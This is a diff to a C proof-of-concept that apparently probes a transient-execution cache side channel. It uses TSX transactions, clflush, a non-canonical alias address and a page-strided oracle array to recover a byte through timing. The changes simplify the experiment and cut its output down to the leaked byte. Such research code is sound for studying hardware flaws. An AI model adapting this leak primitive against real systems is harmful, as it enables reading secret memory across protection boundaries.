@@ -14,8 +14,8 @@
 #include <signal.h>
 #include <ucontext.h>
 #define PG_SIZE (4096U*1)
-#define NUM_EXPR 400
-#define NUM_ROUNDS 10
+#define NUM_EXPR 1 
+#define NUM_ROUNDS 1 
 #define TENREP(a)     a;a;a;a;a;a;a;a;a;a
 #define HUNDREDREP(a) TENREP(TENREP(a))
 #define HUNDREDREP1(a) HUNDREDREP(HUNDREDREP(a))
@@ -83,14 +83,25 @@ static inline void memaccess(void* p){
 }
 
 void void_operations3(volatile char* a, volatile unsigned char* b){
+    volatile unsigned char* mm = NULL;
+    for(int i = 0; i < 5; ++i){
+    	memset(&addr1[i*64], 0xf1, 64);
+	clflush(&addr1[i*64]);
+    }
+
+    asm volatile("mfence");
+
+    for(int i = 0; i < 5; ++i){
+    	addr1[i*64];
+    }
+
     addr1[offset] = 0xe1;
     asm volatile("\txbegin label1\n");
-    addr1[offset] = 0xe1;
-    oraclearr[PG_SIZE * addr3[offset]];
-    oraclearr[PG_SIZE * addr3[offset]];
-    oraclearr[PG_SIZE * addr3[offset]];
-    oraclearr[PG_SIZE * addr2[offset]];
-    oraclearr[PG_SIZE * addr2[offset]];
+    addr1[0] = 0xe1;
+    volatile unsigned char* r = oraclearr + PG_SIZE* ((addr2[0]));
+    *r;*r;
+    *r;*r;
+    *r;*r;
     asm volatile("xend\nlabel1:\n");
 };
 
@@ -154,7 +165,7 @@ int  __attribute__((optimize("-O0")))main(void){
     // addr2 = (char*)(((uint64_t)malloc(20*PG_SIZE) + PG_SIZE) & ~0xFFF );
     addr2 = (volatile char*)((uint64_t)addr1 | 0xff00000000000000); //(char*)(((uint64_t)malloc(20*PG_SIZE) + PG_SIZE) & ~0xFFF );
     cache_evicter = (uint64_t*)malloc(L3CACHESZ + sizeof(uint64_t) /* padding */);
-    addr1[offset] = 0xff;
+    addr1[0] = 0xff;
     tlb_fd = open("/dev/tlb_invalidator", O_WRONLY, 0x0);
     memsize = sysconf(_SC_PAGESIZE) * 1024;
 	mem = (malloc(memsize));
@@ -162,10 +173,12 @@ int  __attribute__((optimize("-O0")))main(void){
     tmp_store = malloc(sizeof(unsigned));
     // EVERYTHING IS INITIALIZED
 experiments_:
-    printf("Running experiments\n");
     memset(averg_rnd, 0x0, 256*sizeof(int64_t));
     memset(averg, 0x0, 256*sizeof(uint64_t));
+    memset(oraclearr, 0x01, PG_SIZE*1024);
+    memset(addr1, 0xf1, 19*PG_SIZE+PG_SIZE-4096);
     addr3[offset] = 0x34;
+    addr3[0] = 0x34;
     // addr2[offset] = 0x34;
     for(int rnd_i = 0; rnd_i < NUM_ROUNDS; ++rnd_i){
         memset(averg, 0x0, 256*sizeof(uint64_t));
@@ -176,7 +189,6 @@ experiments_:
                 f = (volatile char*)oraclearr + PG_SIZE * addr1[offset];
                 asm volatile("\tclflush (%0)\n"::"r"((void*)&oraclearr[PG_SIZE * j]));
                 // flush_all();
-                tlb_flush_all();
                 // evict_full_cache();
                 void_operations1(&a, &b);
                 // asm volatile("mfence");
@@ -186,7 +198,7 @@ experiments_:
         uint64_t min = (uint64_t)-1;
         int minid = -1;
         for(int rn = 0; rn < 256; ++rn){
-            if((averg[rn]/NUM_EXPR) <= (min - 1) && rn > 0 && rn != addr3[offset]){
+            if((averg[rn]/NUM_EXPR) <= (min - 1) && rn > 0 && rn != addr3[offset] ){
                 min = averg[rn]/NUM_EXPR;
                 minid = rn;
             }
@@ -204,14 +216,13 @@ experiments_:
         if(averg_rnd[i] < winner_min){
             winner_min = averg_rnd[i];
         }
-	    printf("BYTE 0x%02x : %4lu wins : %4lu us\n", i, averg_rnd[i], averg[i]/NUM_EXPR);
+	    //printf("BYTE 0x%02x : %4lu wins : %4lu us\n", i, averg_rnd[i], averg[i]/NUM_EXPR);
     }
     if( (winner_max - winner_min) < NUM_ROUNDS / 3) {
-        printf("Not egnough confidence\n");
+        //printf("Not egnough confidence\n");
         goto experiments_;
     }
-    printf("ADRESSES WERE [%p] vs [%p]\n", &addr1[offset], &addr2[offset]);
-    printf("Winner is 0x%02x [%c]\n", winner, winner);
+    printf("0x%02x \n", winner, winner);
     return 1;
 }
 
